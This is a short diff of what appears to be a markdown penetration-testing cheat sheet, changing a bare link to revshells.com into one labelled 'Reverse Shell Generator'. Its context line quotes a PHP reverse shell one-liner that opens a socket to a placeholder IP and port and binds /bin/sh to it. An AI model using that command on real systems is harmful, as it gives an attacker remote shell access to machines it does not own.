@@ -469,8 +469,7 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 
 <br />
 
-[https://www.revshells.com/](https://www.revshells.com/)
-
+[Reverse Shell Generator](https://www.revshells.com/)
 
 <br />
 
